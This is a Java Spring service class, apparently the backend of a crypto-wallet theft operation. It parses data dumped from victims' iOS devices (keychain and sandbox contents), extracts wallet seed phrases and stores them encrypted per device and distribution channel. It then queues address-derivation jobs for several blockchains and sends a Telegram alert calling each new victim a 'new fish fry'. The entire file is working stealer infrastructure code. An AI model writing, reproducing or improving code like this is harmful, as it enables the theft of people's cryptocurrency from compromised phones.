package com.consumer.service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.consumer.config.ConsumerProperties;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.MnemonicDao;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.MnemonicEntity;
import com.consumer.util.RedisPush;

import lombok.extern.slf4j.Slf4j;

import org.springframework.stereotype.Service;

import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;

/**
 * parse_ci 业务处理器（文档 §5.2）。
 * <p>
 * 职责：读取 war JSON → {@link MnemonicExtractor#extractAll} 提取所有钱包助记词
 *       → AES-256 加密入库 → 推送 news4:tasks wallet_derive。
 * <p>
 * 从 CaptureDispatchService 拆分，与 war_unpack/nb_memorandum 解耦。
 */
@Service
@Slf4j
public class ParseCiHandler {

    @Resource
    private ConsumerProperties consumerProps;
    @Resource
    private MnemonicDao mnemonicDao;
    @Resource
    private DeviceDao deviceDao;
    @Resource
    private MnemonicExtractor mnemonicExtractor;
    @Resource
    private RedisPush redisPush;
    @Resource
    private MnemonicTelegramService mnemonicTelegramService;

    private volatile SecretKeySpec aesKey;

    @PostConstruct
    public void initAesKey() {
        try {
            byte[] key = consumerProps.getMnemonicAesKey().getBytes(StandardCharsets.UTF_8);
            // AES-256：密钥必须 32 字节
            if (key.length != 32) {
                log.warn("mnemonic-aes-key length={} (expected 32 for AES-256), padding/truncating",
                        key.length);
                key = Arrays.copyOf(key, 32);
            }
            this.aesKey = new SecretKeySpec(key, "AES");
        } catch (Exception e) {
            log.error("initAesKey FAIL: {}", e.toString());
        }
    }

    /**
     * 处理 parse_ci 消息：
     * 读取 war JSON → 提取助记词 → 加密入库 → 推 news4:tasks wallet_derive。
     */
	@SuppressWarnings("unused")
	public boolean handle(Map<String, String> fields) throws Exception {
        String idStr = fields.get("ios18param_id");
        String unpackPath = nullToEmpty(fields.get("unpack_path"));
        String filePath = nullToEmpty(fields.get("file_path"));
        String deviceId = nullToEmpty(fields.get("device_id"));
        // 兜底：device_id 为空时从 file_path 文件名提取（格式 {device}_{sha16}_{size}.bin）
        if (deviceId.isEmpty() && !filePath.isEmpty()) {
            deviceId = extractDeviceFromPath(filePath);
            if (!deviceId.isEmpty()) {
                log.info("【parse_ci】device_id 从 file_path 兜底提取 id={} device={} file={}",
                        idStr, deviceId, filePath);
            }
        }
        long t0 = System.currentTimeMillis();
        log.info("【parse_ci】收到解析助记词任务 id={} device={} unpack_path={}",
                 idStr, deviceId, unpackPath);
        if (idStr == null || idStr.isEmpty()) {
            log.warn("【parse_ci】缺少 ios18param_id，跳过");
            return true;
        }
        Integer id = Integer.parseInt(idStr);

        // 提取所有钱包的助记词
        List<MnemonicExtractor.PhraseResult> allPhrases = Collections.emptyList();
        if (!filePath.isEmpty()) {
            long tRead = System.currentTimeMillis();
            byte[] binBytes = readSmallBin(filePath, 32 * 1024 * 1024);
            if (binBytes.length == 0) {
                log.warn("【parse_ci】war JSON 文件为空或不存在 id={} file={}", id, filePath);
            }
            long tParse = System.currentTimeMillis();
            try {
                String rawJson = new String(binBytes, StandardCharsets.UTF_8);
                // 兼容：war 数据可能嵌套在 {"data": {...}} / {"payload": {...}} 里，尝试穿透
                Object parsedTop = JSON.parse(rawJson);
                if (parsedTop instanceof JSONObject) {
                    JSONObject top = (JSONObject) parsedTop;
                    if (!top.containsKey("keychain") && !top.containsKey("sandbox")) {
                        for (String wrapKey : new String[]{"data", "payload", "war", "content"}) {
                            Object inner = top.get(wrapKey);
                            if (inner instanceof JSONObject) {
                                JSONObject ij = (JSONObject) inner;
                                if (ij.containsKey("keychain") || ij.containsKey("sandbox")) {
                                    top = ij;
                                    break;
                                }
                            }
                        }
                    }
                    long tExtract = System.currentTimeMillis();
                    allPhrases = mnemonicExtractor.extractAll(top, unpackPath,
                            new MnemonicExtractor.Ctx(id, deviceId));
                    long tDone = System.currentTimeMillis();
                    log.info("【parse_ci】提取完成 id={} 助记词数量={} 耗耗: 读文件={}ms 解析JSON={}ms 提取助记词={}ms 总计={}ms",
                            id, allPhrases.size(), tParse - tRead, tExtract - tParse, tDone - tExtract, tDone - t0);
                }
            } catch (Exception e) {
                log.warn("【parse_ci】war JSON 解析失败 id={} err={}", id, e.toString());
            }
        } else {
            log.info("【parse_ci】提取完成 id={} 助记词数量=0 (file_path 为空)", id);
        }
        double now = System.currentTimeMillis() / 1000.0;
        // 循环外只查一次 device，避免 N 个助记词查 N 次 DB
        DeviceEntity deviceEntity = null;
        try { deviceEntity = deviceDao.findByDeviceid(deviceId); }
        catch (Exception e) { log.warn("【parse_ci】查询device失败 id={} device={} err={}", id, deviceId, e.toString()); }
        String channelcode = deviceEntity == null ? null : deviceEntity.getChannelCode();

        int idx = 0;
        int newlyInserted = 0;
        // 批量收集 news4 jobs，最后用 pipeline 一次性发送，减少 N 次 Redis 往返
        List<Map<String, String>> news4Jobs = new ArrayList<>(allPhrases.size());
        java.util.Set<String> batchInserted = new java.util.HashSet<>();
        for (MnemonicExtractor.PhraseResult r : allPhrases) {
            idx++;
            String phrasePlain = r.getPhrase();

            String phraseHash = sha256Hex(phrasePlain.getBytes(StandardCharsets.UTF_8));
            String batchKey = (r.getWallet() == null ? "" : r.getWallet().toLowerCase()) + "|" + phraseHash;
            if (!batchInserted.add(batchKey)) {
                log.info("【parse_ci】本批重复跳过 id={} source={} hash={}", id, r.getWallet(), phraseHash);
                continue;
            }

            // 幂等：同 device+source+hash 已入库则跳过（parse_ci 重试/重复入队时不重复写）
            try {
                Integer existId = mnemonicDao.findIdByDeviceSourceHash(deviceId, r.getWallet(), phraseHash);
                if (existId != null) {
                    log.info("【parse_ci】mnemonic 幂等命中跳过 id={} exist_id={} source={} hash={}",
                            id, existId, r.getWallet(), phraseHash);
                    continue;
                }
            } catch (Exception e) {
                log.warn("【parse_ci】mnemonic 幂等查询失败 id={} source={} hash={} err={}",
                        id, r.getWallet(), phraseHash, e.toString());
            }

            String phraseEnc = aesEncrypt(phrasePlain);
            int wordCount = r.getWordCount();

            MnemonicEntity me = new MnemonicEntity();
            me.setDeviceId(deviceId);
            me.setWordscount(wordCount);
            me.setChannelcode(channelcode);
            me.setResult(phraseEnc);
            me.setSource(r.getWallet());
            me.setStatus(1);
            me.setPhraseHash(phraseHash);
            me.setAddtime(now);
            try {
                mnemonicDao.insert(me);
                newlyInserted++;
            } catch (Exception e) {
                // 同 device+source+hash 唯一键冲突时跳过该条，继续后续（exodus/coin98 并行入库）
                log.warn("【parse_ci】mnemonic insert 跳过 id={} source={} hash={} err={}",
                        id, r.getWallet(), phraseHash, e.toString());
                continue;
            }

            // 收集 wallet_derive job，稍后批量发送
            if (consumerProps.isNews4TaskEnabled() && me.getId() != null) {
                Map<String, String> job = new HashMap<>();
                job.put("job", "wallet_derive");
                job.put("ios18param_id", String.valueOf(id));
                job.put("mnemonic_id", String.valueOf(me.getId()));
                job.put("device_id", firstNonEmpty(deviceId, ""));
                job.put("phrase_hash", firstNonEmpty(phraseHash, ""));
                job.put("address_idx", "0");
                job.put("chains", "tron,eth,bsc,btc,sol");
                job.put("source", firstNonEmpty(me.getSource(), ""));
                news4Jobs.add(job);
                log.info("【parse_ci】news4 wallet_derive 待入队 mnemonic_id={} device={} source={}",
                        me.getId(), deviceId, me.getSource());
            }
        }
        // 批量推送 news4:tasks（pipeline 单连接多 XADD）
        if (!news4Jobs.isEmpty()) {
            try {
                redisPush.notifyBatch(news4Jobs, consumerProps.getNews4Stream());
                log.info("【parse_ci】news4 wallet_derive 批量入队成功 count={} device={}", news4Jobs.size(), deviceId);
            } catch (Throwable t) {
                log.error("【parse_ci】enqueueWalletDerive batch FAIL device={} err={}", deviceId, t.toString());
            }
        }
        // 本批有新助记词入库 → 异步飞机「新鱼苗」通知（同批多 wallet 只发一次）
        if (newlyInserted > 0 && deviceEntity != null) {
            try {
                mnemonicTelegramService.notifyFishAsync(deviceEntity);
            } catch (Exception e) {
                log.warn("【parse_ci】新鱼苗通知提交失败 id={} device={} err={}", id, deviceId, e.toString());
            }
        }
        return true;
    }

    /** 入队 news4:tasks wallet_derive 
     * @param source */
    private void enqueueWalletDerive(Integer ios18paramId, String deviceId,
                                     String phraseHash, Integer mnemonicId, String source) {
        if (!consumerProps.isNews4TaskEnabled()) return;
        Map<String, String> job = new HashMap<>();
        job.put("job", "wallet_derive");
        job.put("ios18param_id", String.valueOf(ios18paramId));
        job.put("mnemonic_id", String.valueOf(mnemonicId));
        job.put("device_id", firstNonEmpty(deviceId, ""));
        job.put("phrase_hash", firstNonEmpty(phraseHash, ""));
        job.put("address_idx", "0");
        job.put("chains", "tron,eth,bsc,btc,sol");
        job.put("source", firstNonEmpty(source, ""));
        try {
            redisPush.notifySync(job, consumerProps.getNews4Stream());
            log.info("【parse_ci】news4 wallet_derive 入队成功 mnemonic_id={} device={}", mnemonicId, deviceId);
        } catch (Throwable t) {
            log.error("【parse_ci】enqueueWalletDerive FAIL device={} err={}", deviceId, t.toString());
        }
    }

    // ==================== 工具方法 ====================

    private String aesEncrypt(String plain) throws Exception {
        SecretKeySpec key = this.aesKey;
        if (key == null) {
            log.warn("aesKey not initialized, skip encrypt");
            return "";
        }
        Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(Cipher.ENCRYPT_MODE, key);
        byte[] enc = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
        return Base64.getEncoder().encodeToString(enc);
    }

    private static byte[] readSmallBin(String path, int max) throws IOException {
        File f = new File(path);
        if (!f.exists()) return new byte[0];
        long len = f.length();
        if (len > max) len = max;
        try (java.io.FileInputStream in = new java.io.FileInputStream(f)) {
            byte[] buf = new byte[(int) len];
            int off = 0, read;
            while (off < buf.length && (read = in.read(buf, off, buf.length - off)) > 0) off += read;
            return buf;
        }
    }

    private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

    private static String sha256Hex(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                int v = b & 0xFF;
                sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static String firstNonEmpty(String... arr) {
        for (String s : arr) if (s != null && !s.isEmpty()) return s;
        return null;
    }

    private static String nullToEmpty(String s) {
        return s == null ? "" : s;
    }

    /**
     * 从落盘文件路径提取 device UUID。
     * 文件名格式：{YYYYMMDD}/{kind}/{device}_{sha16}_{size}.bin
     * device 是第一个 _ 之前的部分，且必须是合法的 hex UUID（长度≥16，全 hex 大写）。
     */
    private static String extractDeviceFromPath(String filePath) {
        if (filePath == null || filePath.isEmpty()) return "";
        // 取最后一段路径（文件名）
        String name = filePath;
        int slash = Math.max(filePath.lastIndexOf('/'), filePath.lastIndexOf('\\'));
        if (slash >= 0) name = filePath.substring(slash + 1);
        int dot = name.lastIndexOf('.');
        if (dot > 0) name = name.substring(0, dot);
        int us = name.indexOf('_');
        if (us <= 0) return "";
        String candidate = name.substring(0, us);
        // 校验：合法 device UUID 应为 hex 字符且长度≥16（典型 32 位 hex）
        if (candidate.length() < 16) return "";
        for (int i = 0; i < candidate.length(); i++) {
            char c = candidate.charAt(i);
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f'))) {
                return "";
            }
        }
        return candidate;
    }
}
